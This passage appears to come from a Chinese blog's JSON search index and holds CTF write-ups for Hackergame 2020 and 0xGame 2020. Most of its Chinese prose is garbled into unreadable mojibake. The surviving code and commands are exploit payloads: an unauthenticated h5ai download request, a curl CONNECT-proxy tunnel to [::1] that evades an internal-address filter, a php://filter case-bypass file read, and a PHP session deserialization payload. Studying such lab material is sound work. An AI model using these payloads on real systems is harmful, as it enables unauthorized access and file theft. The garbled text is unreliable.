çœ‹äº†ä¸‹ä¹Ÿä¸æ˜¯ã€‚ ä¸è¡Œäº†ä¸è¡Œäº†ï¼Œæ„Ÿè§‰ä¸æ˜¯ nginx çš„é—®é¢˜ï¼Œå¾—å®¡è®¡æºç äº†ã€‚ æ ¹æ® Nginx é…ç½®ï¼Œè®¿é—®è¿™ä¸ª http://202.38.93.111:10120/Public/_h5ai/public/index.php ï¼Œå‘ç°å¯†ç ä¸ºç©ºï¼Œæœ‰ä¸€äº›ç›¸å…³çš„ä¿¡æ¯ã€‚ æŠŠæºç ä¸‹è½½ä¸‹æ¥ï¼Œè¿™ä¸ªindex.phpè°ƒç”¨äº† class-bootstrap.phpã€‚ require_once __DIR__ . '/../private/php/class-bootstrap.php'; Bootstrap::run(); class-bootstrap.php é‡Œåˆ¤æ–­è¯·æ±‚æ¥æºï¼Œåˆ¤æ–­æ˜¯ api/info/elseï¼Ÿ public static function run() { spl_autoload_register(['Bootstrap', 'autoload']); putenv('LANG=en_US.UTF-8'); setlocale(LC_CTYPE, 'en_US.UTF-8'); date_default_timezone_set(@date_default_timezone_get()); session_start(); $session = new Session($_SESSION); $request = new Request($_REQUEST, file_get_contents('php://input')); $setup = new Setup($request-&gt;query_boolean('refresh', false)); $context = new Context($session, $request, $setup); if ($context-&gt;is_api_request()) { (new Api($context))-&gt;apply(); } elseif ($context-&gt;is_info_request()) { $public_href = $setup-&gt;get('PUBLIC_HREF'); $x_head_tags = $context-&gt;get_x_head_html(); $fallback_mode = false; require __DIR__ . '/pages/info.php'; } else { $public_href = $setup-&gt;get('PUBLIC_HREF'); $x_head_tags = $context-&gt;get_x_head_html(); $fallback_mode = $context-&gt;is_fallback_mode(); $fallback_html = (new Fallback($context))-&gt;get_html(); require __DIR__ . '/pages/index.php'; } } class-context.php: public function is_api_request() { return strtolower($this-&gt;setup-&gt;get('REQUEST_METHOD')) === 'post'; } äºæ˜¯åªè¦å‘ä¸ª POST è¯·æ±‚å°±èƒ½è°ƒç”¨ API. è¯•è¯•å‘ç°ç¼ºå‚æ•°ã€‚ çœ‹è°ƒç”¨ï¼š (new Api($context))-&gt;apply(); class-api.php: public function apply() { $action = $this-&gt;request-&gt;query('action'); $supported = ['download', 'get', 'login', 'logout']; Util::json_fail(Util::ERR_UNSUPPORTED, 'unsupported action', !in_array($action, $supported)); $methodname = 'on_' . $action; $this-&gt;$methodname(); } private function on_download() { Util::json_fail(Util::ERR_DISABLED, 'download disabled', !$this-&gt;context-&gt;query_option('download.enabled', false)); $as = $this-&gt;request-&gt;query('as'); $type = $this-&gt;request-&gt;query('type'); $base_href = $this-&gt;request-&gt;query('baseHref'); $hrefs = $this-&gt;request-&gt;query('hrefs', ''); $archive = new Archive($this-&gt;context); set_time_limit(0); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename=\"' . $as . '\"'); header('Connection: close'); $ok = $archive-&gt;output($type, $base_href, $hrefs); Util::json_fail(Util::ERR_FAILED, 'packaging failed', !$ok); exit; } æˆ‘è¿™é‡Œç”¨äº† download æ–¹æ³•ï¼ŒæŒ‰ç…§ä»£ç ä¾æ¬¡è¡¥ä¸Šå‚æ•°å°±å®Œäº‹äº†ã€‚ class-archive.php: public function output($type, $base_href, $hrefs) { $this-&gt;base_path = $this-&gt;context-&gt;to_path($base_href); if (!$this-&gt;context-&gt;is_managed_path($this-&gt;base_path)) { return false; } $this-&gt;dirs = []; $this-&gt;files = []; $this-&gt;add_hrefs($hrefs); if (count($this-&gt;dirs) === 0 &amp;&amp; count($this-&gt;files) === 0) { if ($type === 'php-tar') { $this-&gt;add_dir($this-&gt;base_path, '/'); } else { $this-&gt;add_dir($this-&gt;base_path, '.'); } } if ($type === 'php-tar') { return $this-&gt;php_tar($this-&gt;dirs, $this-&gt;files); } elseif ($type === 'shell-tar') { return $this-&gt;shell_cmd(Archive::$TAR_PASSTHRU_CMD); } elseif ($type === 'shell-zip') { return $this-&gt;shell_cmd(Archive::$ZIP_PASSTHRU_CMD); } return false; } è¿™é‡Œå°±ç”¨ shell-zip å¥½äº†ï¼Œå…¶å®éƒ½è¡Œã€‚ äºæ˜¯è¿™é¢˜å…¶å®å°±æ˜¯ h5ai è‡ªå¸¦çš„ API é€ æˆçš„æ–‡ä»¶è¯»å–ï¼Œä¸»è¦è¿™ä¸ªæ¥å£æ²¡æœ‰é‰´æƒï¼Œæ›´ä¸»è¦çš„æ˜¯ Dockerfile é‡Œç”¨çš„æ˜¯ cp å¤åˆ¶è€Œä¸æ˜¯ mv ç§»åŠ¨ã€‚ å™¢å¯¹äº†ï¼Œè¦ç”¨æ ¹ç›®å½•çš„é‚£ä¸ª _h5ai. ï¼ˆå‘ç°æ ¹ç›®å½•è®¿é—® .php ä¼šç›´æ¥ä¸¢ç»™ fastcgi å¤„ç†äº†ï¼Œä¹Ÿå°±ç»•è¿‡äº† Basic Authã€‚ Payload: POST http://202.38.93.111:10120/_h5ai/public/index.php?action=download&amp;as=flag&amp;type=shell-zip&amp;baseHref=/ ï¼ˆhrefs å‚æ•°å‘ç°ä¸éœ€è¦ä¹Ÿè¡Œã€‚ ä¿å­˜å“åº”ï¼Œç„¶åè§£å‹å°±å¾—åˆ° flag.txt äº†ã€‚ flag{super_secure_cloud} BTW, æœ‰å¤§ä½¬å‘ç°è¿™é‡Œçš„hrefs å‚æ•°æ²¡æœ‰æ£€æŸ¥ \\\\.., ..\\\\ ç­‰ï¼Œå¯ä»¥æ„é€ è·¯å¾„ /Public\\\\..\\\\flag.txtï¼Œæ­¤æ—¶ç»è¿‡ normalize å /Public/../ï¼Œä»è€Œè·¯å¾„ç©¿è¶Šå®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚ è¯¦è§ cytvictor å¸ˆå‚…çš„ WriteUp h5ai#758: A potential security issue of unauthorized access ä»¥åŠ h5ai#760: Unchecked l10n input leads to arbitrary JSON file reads ï¼ˆç®—æ˜¯ 0day æ¼æ´äº†å§ è¶…å®‰å…¨çš„ä»£ç†æœåŠ¡å™¨ï¼ˆå¤ç°ï¼‰ åœ¨ 2039 å¹´ï¼Œçˆ†å‘äº†ä¸€åœºå²æ— å‰ä¾‹çš„ç–«æƒ…ã€‚ä¸ºäº†ä¾¿äºåœ¨å„åœ°çš„åŒå­¦è®¿é—®æŸçŸ¥åå¤§å­¦ã€Œè£¤å­å¤§ã€çš„ç½‘ç«™è¿›è¡Œã€Œæ¯æ—¥å¥åº·æ‰“å¡ã€ï¼Œå° C åŒå­¦ä¸ºå¤§å®¶æä¾›äº†è¿™æ ·ä¸€ä¸ªä»£ç†æœåŠ¡ã€‚æ›¾ç»ä¿¡æ¯å®‰å…¨ä¸“ä¸šå‡ºèº«çš„å° C å†³å®šæŠŠè¿™ä¸ªä»£ç†è®¾è®¡æˆæœ€å®‰å…¨çš„ä»£ç†ã€‚ æç¤ºï¼šæµè§ˆå™¨å¯èƒ½ä¼šæç¤ºè¯¥ TLS è¯ä¹¦æ— æ•ˆï¼Œä¸æœ¬é¢˜è§£æ³•æ— å…³ï¼Œä¿¡ä»»å³å¯ã€‚ å…¬å‘Šï¼šé¢˜ç›®å¸®åŠ©é¡µé¢ï¼ˆhttps://146.56.228.227/helpï¼‰å³ä¸‹è§’çš„ã€Œç®¡ç†ä¸­å¿ƒã€é“¾æ¥æœ‰è¯¯ï¼Œåº”è¯¥ä¸é¦–é¡µç›¸åŒï¼Œéƒ½æ˜¯æŒ‡å‘ http://127.0.0.1:8080/ æ‰¾åˆ° Secret è¿™é¢˜ç”¨äº† HTTP2 çš„ Server PUSHã€‚ å…·ä½“å¯ä»¥å‚è€ƒä¸€ä¸‹ Wikipedia: HTTP/2 Server Push ä»¥åŠ é˜®ä¸€å³°çš„HTTP/2 æœåŠ¡å™¨æ¨é€ï¼ˆServer Pushï¼‰æ•™ç¨‹ã€‚ é€šå¸¸ç”¨åˆ° Server Push çš„è¯éƒ½æ˜¯æŠŠ CSSã€JS ä¹‹ç±»çš„èµ„æºé¡ºä¾¿æ¨é€ç»™ç”¨æˆ·ï¼Œç„¶è€Œè¿™ä¸€é¢˜æ¢äº†å‡ ä¸ªæµè§ˆå™¨éƒ½æ²¡è§åˆ°æ¨é€äº†å•¥èµ„æºâ€¦â€¦ ç”šè‡³ç”¨ Postmanï¼ˆè²Œä¼¼ä¸æ”¯æŒ HTTP2?ï¼‰ / Burp Suiteï¼ˆæ‰‹åŠ¨æ”¹è¯·æ±‚å¤´ï¼‰é™çº§åˆ° HTTP/1.0 æˆ–è€… HTTP/1.1ï¼Œå°±ä¸è®©ä½ ç”¨ã€‚ è€Œ cURL éƒ½ç›´æ¥ä¸è®©ä½ ç”¨ã€‚æŠŠ headers éƒ½åŠ ä¸Šäº†ï¼Œä¹Ÿä¸çŸ¥é“ä»–æ€ä¹ˆåˆ¤æ–­åˆ°çš„ã€‚ã€‚ curl \"https://146.56.228.227/\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0\" -H \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" -H \"Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" --compressed -H \"Connection: keep-alive\" -H \"Upgrade-Insecure-Requests: 1\" -H \"Pragma: no-cache\" -H \"Cache-Control: no-cache\" -H \"TE: Trailers\" -k -vv --http2 ä½†æ˜¯è¿™ä¸ªä¿¡æ¯è‚¯å®šæ˜¯åœ¨ç½‘ç»œæµé‡Œä¼ è¾“çš„ï¼ŒWireshark æŠ“åŒ…çš„è¯è‚¯å®šèƒ½æŠ“åˆ°ã€‚ ä½†æ˜¯è¿™é‡Œç”¨åˆ°äº† tls åŠ å¯†ï¼Œç›´æ¥æŠ“æ˜¯æŠ“ä¸åˆ°æ˜æ–‡çš„ï¼Œç„¶è€Œæˆ‘åšè¿™é¢˜çš„æ—¶å€™æ²¡é…å¥½è¿˜æ˜¯æ²¡æŠ“åˆ°æ˜æ–‡ï¼ˆå¤§è‰ã€‚ é¦–å…ˆéœ€è¦åœ¨ç³»ç»Ÿè®¾ç½®ä¸€ä¸ª SSLKEYLOGFILE ç¯å¢ƒå˜é‡ï¼Œå˜é‡å€¼ä¸ºä½ å–œæ¬¢çš„è·¯å¾„ä¸‹å»ºçš„ä¸€ä¸ªç”¨æ¥ä¿å­˜ log çš„æ–‡ä»¶ã€‚ è€Œååœ¨ wireshark é‡Œè®¾ç½®æ–‡ä»¶è·¯å¾„ã€‚ å†æ‰“å¼€æµè§ˆå™¨è®¿é—®é¢˜ç›®ï¼Œå°±èƒ½åœ¨ wireshark é‡ŒæŠ“åˆ°æ˜æ–‡åŒ…äº†ã€‚ è¿½è¸ª TLS æµ / HTTP2 stream å°±èƒ½çœ‹åˆ°è¿™ä¸ªæ¨é€çš„ secret å’Œ flag1 äº†ã€‚ âš  æŠ“åŒ…å®Œæˆåè¯·åŠæ—¶åˆ é™¤æ­¤ç¯å¢ƒå˜é‡ï¼Œé˜²æ­¢ä¿¡æ¯æ³„éœ²ã€‚ è¿™ä¸ªé¢˜çœ‹åˆ°å®˜æ–¹WP ç»™äº†åŸºäº nghttp2 çš„è§£æ³•ã€‚ nghttp -v https://146.56.228.227/ å…¥ä¾µç®¡ç†ä¸­å¿ƒç½‘é¡µä¸Šçš„ ç®¡ç†ä¸­å¿ƒ URL ä¸º http://127.0.0.1:8080/ ï¼Œè®¿é—® http://146.56.228.227:8080/ æç¤º ç®¡ç†ä¸­å¿ƒæ— æ³•ä»å…¬ç½‘ç›´æ¥è®¿é—® æ ¹æ® å¸®åŠ© ç»™å‡ºçš„æç¤ºï¼Œéœ€è¦åˆ©ç”¨ CONNECT åè®®ã€‚ æ ¹æ® RFC 7231 ä¸­çš„ç›¸å…³å†…å®¹ï¼Œç»“åˆé¢˜ç›®æ‰€éœ€çš„secretï¼Œè¯·æ±‚å¤´æ ¼å¼å¦‚ä¸‹ã€‚ CONNECT server.example.com:80 HTTP/1.1 Host: server.example.com:80 Secret: xxxxxxxx å†çœ‹è¿‡æ»¤çš„åˆ—è¡¨ å…¨çƒå•æ’­åœ°å€ 10.0.0.0/8 127.0.0.0/8 172.16.0.0/12 192.168.0.0/16 å…¶ä¸­ä¸åŒ…æ‹¬ IPv6 åœ°å€ï¼Œå¯ä»¥è¯•è¯•æœ¬åœ°ç¯å›ï¼Œå³[::1]ã€‚ æ„é€ è¯·æ±‚å‘è¿‡å»è¯•è¯•ï¼Œå‘ç°æˆåŠŸå»ºç«‹è¿æ¥ã€‚ The recipient proxy can establish a tunnel either by directly connecting to the request-target or, if configured to use another proxy, by forwarding the CONNECT request to the next inbound proxy. Any 2xx (Successful) response indicates that the sender (and all inbound proxies) will switch to tunnel mode immediately after the blank line that concludes the successful responseâ€™s header section; data received after that blank line is from the server identified by the request-target. Any response other than a successful response indicates that the tunnel has not yet been formed and that the connection remains governed by HTTP. A tunnel is closed when a tunnel intermediary detects that either side has closed its connection: the intermediary MUST attempt to send any outstanding data that came from the closed side to the other side, close both connections, and then discard any remaining data left undelivered. è¯´æ˜éš§é“å·²ç»å»ºç«‹äº†ï¼Œä½†è²Œä¼¼åšä¸åˆ°é©¬ä¸Šå‘ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œäºæ˜¯éš§é“å°±å…³é—­äº†ã€‚ ç”¨ Burp Suite å‘åŒ…è¿™ä¸ªæ–¹æ¡ˆä¸å®åœ¨ï¼ˆï¼ˆ å¥½çƒ¦å•Šå–µï¼Œç”¨ curl å¥½äº†å§ã€‚ï¼ˆå‚è€ƒäº†å®˜æ–¹ WPï¼‰ éœ€è¦å¸¦ä¸Š Refererï¼Œå¦åˆ™ä¼šæç¤º ç®¡ç†ä¸­å¿ƒéœ€è¦ä» â€˜146.56.228.227â€™ è¢«è®¿é—®(Referer) $ curl -x https://146.56.228.227:443 --proxy-insecure -vvnn -p --proxy-header \"Secret: aa08235651\" http://[::1]:8080 -H \"Referer: 146.56.228.227\" * Rebuilt URL to: http://[::1]:8080/ * Couldn't find host ::1 in the .netrc file; using defaults * Trying 146.56.228.227... * TCP_NODELAY set * Connected to 146.56.228.227 (146.56.228.227) port 443 (#0) * successfully set certificate verify locations: * CAfile: /etc/ssl/certs/ca-certificates.crt CApath: /etc/ssl/certs * TLSv1.3 (OUT), TLS handshake, Client hello (1): * TLSv1.3 (IN), TLS handshake, Server hello (2): * TLSv1.3 (IN), TLS Unknown, Certificate Status (22): * TLSv1.3 (IN), TLS handshake, Unknown (8): * TLSv1.3 (IN), TLS Unknown, Certificate Status (22): * TLSv1.3 (IN), TLS handshake, Certificate (11): * TLSv1.3 (IN), TLS Unknown, Certificate Status (22): * TLSv1.3 (IN), TLS handshake, CERT verify (15): * TLSv1.3 (IN), TLS Unknown, Certificate Status (22): * TLSv1.3 (IN), TLS handshake, Finished (20): * TLSv1.3 (OUT), TLS change cipher, Client hello (1): * TLSv1.3 (OUT), TLS Unknown, Certificate Status (22): * TLSv1.3 (OUT), TLS handshake, Finished (20): * SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 * Proxy certificate: * subject: O=mkcert development certificate; OU=root@hg20-debian * start date: Jun 1 00:00:00 2019 GMT * expire date: Oct 23 01:13:11 2030 GMT * issuer: O=mkcert development CA; OU=root@hg20-debian; CN=mkcert root@hg20-debian * SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway. * allocate connect buffer! * Establish HTTP proxy tunnel to ::1:8080 * TLSv1.3 (OUT), TLS Unknown, Unknown (23): &gt; CONNECT [::1]:8080 HTTP/1.1 &gt; Host: [::1]:8080 &gt; User-Agent: curl/7.58.0 &gt; Proxy-Connection: Keep-Alive &gt; Secret: aa08235651 &gt; * TLSv1.3 (IN), TLS Unknown, Certificate Status (22): * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): * TLSv1.3 (IN), TLS Unknown, Unknown (23): &lt; HTTP/1.1 200 OK * TLSv1.3 (IN), TLS Unknown, Unknown (23): &lt; Content-Length: 0 * Ignoring Content-Length in CONNECT 200 response * TLSv1.3 (IN), TLS Unknown, Unknown (23): &lt; * Proxy replied 200 to CONNECT request * CONNECT phase completed! * CONNECT phase completed! * CONNECT phase completed! * TLSv1.3 (OUT), TLS Unknown, Unknown (23): &gt; GET / HTTP/1.1 &gt; Host: [::1]:8080 &gt; User-Agent: curl/7.58.0 &gt; Accept: */* &gt; Referer: 146.56.228.227 &gt; * TLSv1.3 (IN), TLS Unknown, Unknown (23): &lt; HTTP/1.1 200 OK &lt; Date: Sat, 07 Nov 2020 15:59:36 GMT &lt; Content-Length: 32 &lt; Content-Type: text/plain; charset=utf-8 &lt; * Connection #0 to host 146.56.228.227 left intact flag2: flag{c0me_1n_t4_my_h0use} å¦å¤–çœ‹åˆ° imlonghao å¸ˆå‚…çš„å‘½ä»¤å¤§æ³•ã€‚ï¼ˆåŸæ¥çš„ä»£ç åœ¨æˆ‘è¿™ Ubuntu æŠ¥é”™ï¼Œäºæ˜¯æ”¹äº†ä¸€ä¸‹åå¼•å·æ‰§è¡Œï¼‰ curl -v -k --proxy https://146.56.228.227/ --proxy-insecure --proxy-header \"Secret: `(nghttp https://146.56.228.227/ 2&gt;/dev/null | grep secret: | awk '{print $4}')`\" http://www.ustc.edu.cn.127.0.0.1.nip.io:8080/ -p -H \"Referer: https://146.56.228.227\" BTWï¼Œ www.ustc.edu.cn.127.0.0.1.nip.io è¿™ä¸ªåŸŸåä¼šè§£æåˆ° 127.0.0.1ï¼Œè¯¦è§ https://nip.io ä»»æ„ IP DNS æ³›åŸŸåã€‚ ä¸ç»æ„ä¼ è¾“from Crypto.PublicKey import RSA from random import SystemRandom import os if __name__ == \"__main__\": random = SystemRandom() key = RSA.generate(1024) print(\"n =\", key.n) print(\"e =\", key.e) m0 = int.from_bytes(os.urandom(64).hex().encode(), \"big\") m1 = int.from_bytes(os.urandom(64).hex().encode(), \"big\") x0 = random.randrange(key.n) x1 = random.randrange(key.n) print(\"x0 =\", x0) print(\"x1 =\", x1) v = int(input(\"v = \")) m0_ = (m0 + pow(v - x0, key.d, key.n)) % key.n m1_ = (m1 + pow(v - x1, key.d, key.n)) % key.n print(\"m0_ =\", m0_) print(\"m1_ =\", m1_) guess0 = int(input(\"m0 = \")) guess1 = int(input(\"m1 = \")) if guess0 == m0: print(open(\"flag1\").read()) if guess1 == m1: print(open(\"flag2\").read()) else: print(\"Nope\") è§£å¯†æ¶ˆæ¯ç›´æ¥ä»¤ v = x0ï¼Œè¿™æ ·ç›´æ¥å°± m0_ = m0 äº†ï¼Œå¾—åˆ° flag1. å°ç»“æ€»è€Œè¨€ä¹‹ï¼Œè¿™æ¬¡ Hackergame é¢˜ç›®å¾ˆæœ‰æ¢¯åº¦ï¼Œå¾ˆæœ‰è„‘æ´ï¼Œæ„Ÿè§‰ä¸é”™ï¼Œå­¦åˆ°äº†è®¸å¤šï¼Œä¸‹æ¬¡è¿˜æ¥ã€‚ æ’åçš„è¯ä¸åœå¼¹è·³ï¼Œå¥½ä¸å®¹æ˜“åšå‡ºé“é¢˜ç›®ä¸Šå»äº†ï¼Œè€Œåæ‰ä¸‹æ¥ï¼Œåˆ°äº†æœ€é«˜çš„è®°å½•ä¹Ÿå°±æ€»æ¦œ rk31 äº†ï¼Œæœ€åè¿˜æ˜¯ä¸åœå¾€ä¸‹æ‰ï¼Œæœ€åéƒ½åˆ°æ€»æ¦œ rk41äº†ï¼Œ233. rk31 é¡ºä¾¿ç•™ä¸ªçºªå¿µğŸ‘‡ å¤§å¸ˆå‚…ä»¬å¤ªå¼ºäº†ï¼ å–µå‘œï¼Œè¿˜æ˜¯å¤ªèœäº†å•Šï¼Œæˆ‘è‡ªå·±çˆ¬ï¼ˆ æ„Ÿè§‰è¿™ç¯‡å¯ä»¥è¯´æ˜¯æœ€é•¿ä¸€ç¯‡åšå®¢äº†å”‰ ï¼ˆå…ˆè¿™æ ·å§ å†™ä¸åŠ¨äº† ï¼ˆæºœäº†æºœäº†å–µ","path":"2020/11/08/CTF_2020Hackergame/"},{"title":"CTF | 2020 0xGame Web&Misc éƒ¨åˆ†WriteUp","text":"å‰è¨€å—é‚®çš„å¸ˆå‚…ä»¬æ•´äº†ä¸ª 0xGameï¼Œæ¯”èµ›æŒç»­äº†ä¸€ä¸ªæœˆï¼Œæ¯å‘¨æ”¾å‡ºä¸€å®šçš„é¢˜ç›®ã€‚ å¤§æ¦‚çœ‹äº†çœ‹ï¼Œé¢˜ç›®è¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ã€‚ æ¯”èµ›å¹³å°ï¼šhttp://game.0xctf.com/ å¾€æœŸèµ›é¢˜ç¯å¢ƒï¼šhttps://shimo.im/docs/8hkRHdRDdWyKycyK ä¸»è¦é¡ºä¾¿æ€»ç»“äº†ä¸€ä¸‹ PHP SESSION åºåˆ—åŒ–å¼•æ“ä¸åŒå¸¦æ¥çš„ååºåˆ—åŒ–æ¼æ´å§ã€‚ ï¼ˆç”±äºæ¯”è¾ƒæ‡’å°±æ²¡æ€ä¹ˆå†™ WPï¼Œå†™çš„ä¹Ÿæ¯”è¾ƒç®€ç•¥ å˜¤å˜¤å˜¤ï¼ˆè·‘ Week 4Web_switch å°æ˜åœ¨ä½¿ç”¨vimæ—¶ç”µè„‘æ­»æœºäº†ï¼Œä½†æ˜¯ä»–å†™çš„ä»£ç è¿˜æ²¡æœ‰ä¿å­˜ï¼Œè¿™å¯æ€ä¹ˆåŠå‘¢ï¼Ÿ http://web.game.0xctf.com:30103/ è®¿é—®æ˜¾ç¤º Do you know vim in Linux? æƒ³åˆ°åº”è¯¥æ˜¯ vim çš„ç¼“å­˜æ–‡ä»¶å§ã€‚ å³ .index.php.swp ä¸‹è½½ä»¥åç”¨ vim åŠ è½½ vim -r .index.php.swp è€Œå :wq ä¿å­˜å¾—åˆ°æºç ã€‚ &lt;?php error_reporting(0);//flag in flag.php $id = $_POST['id']?$_POST['id']:0; $file = $_POST['file']?$_POST['file']:\"\"; if($id == '2'){ die(\"no no no !\"); } switch ($id) { case 0: die('&lt;h1 align=\"center\"&gt;&lt;font color=\"red\"&gt;Do you know vim in Linux?&lt;/font&gt;&lt;/h1&gt;'); case 1: die(\"0xGame Good!\"); case 2: if(preg_match('/filter|base64/', $file)){ die(\"hacker\"); } include($file); } POST æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œid çš„è¯åœ¨ switch é‡Œä¼šè¢«å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œåªéœ€è¦è¾“å…¥ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º 2 å³å¯ã€‚ file çš„è¯ç”¨ PHP ä¼ªåè®®å»è¯»å–ã€‚ è™½ç„¶è¿‡æ»¤äº†filter|base64ï¼Œä½†åŒ¹é…æ—¶æ²¡æœ‰ä¸åŒºåˆ†å¤§å°å†™ï¼Œè€Œ PHP å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œäºæ˜¯æ”¹ä¸ªå¤§å°å†™å°±å®Œäº‹äº†ã€‚ payload: id=2sdf&amp;file=php://filTer/read=convert.basE64-encode/resource=flag.php å¾—åˆ° PD9waHANCiRmbGFnPScweEdhbWV7UzBtZV9wSHBfdFIxY0tzX3VfRzN0XzF0fSc7 base64decode &lt;?php $flag='0xGame{S0me_pHp_tR1cKs_u_G3t_1t}'; get! Web_broken_motto mottoä¸ºå•¥æŸ¥çœ‹ä¸äº†äº†å•Šï¼Ÿ Hintï¼šæ³¨æ„æŸ¥çœ‹æ³¨é‡Šçš„åœ°æ–¹ï¼Œæ³¨é‡Šå‰åæœ‰ä»€ä¹ˆåŒºåˆ« é¢˜ç›®åœ°å€ ç°å­¦ç°å–çš„ä¸€é¢˜ï¼Œé¡ºä¾¿æ¥æ€»ç»“äº†ä¸€ä¸‹ç›¸å…³çš„çŸ¥è¯†ç‚¹ï¼ŒPHP å¤ªå¥‡å¦™äº†çœŸçš„ã€‚ å…ˆæºç å®¡è®¡ã€‚ register.php: &lt;?php require_once 'class.php'; session_save_path('session'); ini_set('session.serialize_handler','php_serialize'); session_start(); if(isset($_POST['username'])&amp;&amp;isset($_POST['password'])){ $user = new User($_POST['username'], $_POST['password'], $_POST['motto']); $user-&gt;register(); echo 'register success!'.\"&lt;br/&gt;\"; echo '&lt;a href=\"profile.php\"&gt;click hear to see your motto&lt;/a&gt;'; }else{ die('empty username or password!'); } ?&gt; profile.php: &lt;?php require_once 'class.php'; //ini_set('session.serialize_handler','php_serialize'); session_save_path('session'); session_start(); if(isset($_SESSION['username'])){ $info = new info(); }else{ die('å‡ºé”™å•¦ï¼è¯»å–ä¸åˆ°ä½ çš„æ ¼è¨€QWQ'); } class.php: &lt;?php class User { public $username; public $password; public $motto; function __construct($username, $password, $motto) { $this-&gt;username = $username; $this-&gt;password = $password; $this-&gt;motto = $motto; } public function register(){ $_SESSION['username'] = $this-&gt;username; $_SESSION['password'] = $this-&gt;password; $_SESSION['motto'] = $this-&gt;motto; } } class info{ public $admin; public $username; public $motto; public function __construct() { $this-&gt;admin = 0; $this-&gt;motto = $_SESSION['motto']; $this-&gt;username = $_SESSION['username']; } public function __destruct() { echo 'your motto:'.$this-&gt;motto; if($this-&gt;admin===1){ show_source('flag.php'); } } } æˆ‘ä»¬éœ€è¦è®© $this-&gt;admin=1ï¼Œä»è€Œæ˜¾ç¤º flagã€‚ PHP åœ¨ååºåˆ—åŒ–å­˜å‚¨çš„ $_SESSION æ•°æ®æ—¶ä½¿ç”¨çš„å¼•æ“å’Œåºåˆ—åŒ–ä½¿ç”¨çš„å¼•æ“ä¸ä¸€æ ·ï¼Œä»è€Œå¼•å…¥äº†æ¼æ´ã€‚ PHP é‡Œæœ‰ä¸‰ç§åºåˆ—åŒ–å¼•æ“ï¼Œå…¶ä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯ php å¼•æ“ã€‚ php_binary: å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦+é”®å+ç»è¿‡ serialize() å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ php: å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡ serialize() å‡½æ•°åºåˆ—å¤„ç†çš„å€¼ php_serialize (php&gt;5.5.4): å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡ serialize() å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ PHP é‡Œçš„ SESSION æ˜¯ä¿å­˜åœ¨æ–‡ä»¶é‡Œçš„ï¼Œæ–‡ä»¶åæ ¼å¼ä¸º sess_PHPSESSIDï¼Œä¾‹å¦‚ï¼š æ ¹æ® hintï¼Œprofile é‡Œçš„åº”è¯¥ç”¨çš„æ˜¯é»˜è®¤çš„ php åºåˆ—åŒ–å¼•æ“ï¼Œè€Œ register é‡Œç”¨çš„æ˜¯ php_serializeã€‚ profile é‡Œéœ€è¦ isset($_SESSION['username']) æ‰èƒ½è¿›å…¥ï¼Œè€Œè¿™ä¸ª session æ˜¯åœ¨æ³¨å†Œæ—¶ User ç±»é‡Œè®¾ç½®çš„ï¼Œ å³ $_SESSION['username'] = $this-&gt;username;ã€‚ è®¿é—® profile æ—¶æ‰§è¡Œ session_start(); è¯­å¥æ—¶ä»æ–‡ä»¶ä¸­è¯»å– sessionï¼Œå°†å…¶ååºåˆ—åŒ–ã€‚ é‚£ä¹ˆæˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ªåºåˆ—åŒ–å¥½çš„å¯¹è±¡ï¼Œç¼–å†™ä¸€æ®µ php ä»£ç æ¥å¾—åˆ°ã€‚ &lt;?php class info{ public $admin; public $username; public $motto; public function __construct() { $this-&gt;admin = 1; $this-&gt;motto = \"adfs\"; $this-&gt;username = \"admin\"; } } $x=new info(); echo serialize($x); å¾—åˆ°åºåˆ—åŒ–åçš„ä¸ºï¼š O:4:\"info\":3:{s:5:\"admin\";i:1;s:8:\"username\";s:5:\"admin\";s:5:\"motto\";s:4:\"adfs\";} åœ¨æœ€å‰é¢åŠ ä¸Š |ï¼Œæ”¾åˆ°usernameé‡Œã€‚ register é‡Œä½¿ç”¨ php_serialize æ‰§è¡Œ $_SESSION['username'] = $this-&gt;username; è¯­å¥æ—¶ï¼Œsession æ–‡ä»¶ä¸­å­˜å‚¨çš„å†…å®¹ä¸º a:1:{s:8:\"username\";s:82:\"|O:4:\"info\":3:{s:5:\"admin\";i:1;s:8:\"username\";s:5:\"admin\";s:5:\"motto\";s:4:\"adfs\";}\";} è€Œ profile åœ¨ session_start(); æ‰§è¡Œè¯»å–æ—¶å°†è¿™ä¸ªæ–‡ä»¶é‡Œçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ã€‚ å°† | ä¹‹å‰çš„å†…å®¹ä½œä¸º SESSION çš„ keyï¼Œä¹‹åçš„å†…å®¹ä½œä¸º valueï¼Œæ‹¿å» unserializeã€‚ å³ key ä¸º a:1:{s:8:\"username\";s:82:\"ï¼Œ value ä¸º O:4:\"info\":3:{s:5:\"admin\";i:1;s:8:\"username\";s:5:\"admin\";s:5:\"motto\";s:4:\"adfs\";}\";}ã€‚ äºæ˜¯åœ¨è®¿é—® profile é¡µé¢æ—¶ï¼Œä¼šååºåˆ—åŒ–ä¼ªé€ çš„æ•°æ®ï¼Œå®ä¾‹åŒ– info å¯¹è±¡ï¼Œæœ€åå°±ä¼šæŠŠ admin ç½®ä¸º1äº†ã€‚ å…ˆæœ¬åœ°è¯•è¯•ï¼Œæ„é€  payload å¦‚ä¸‹ã€‚ 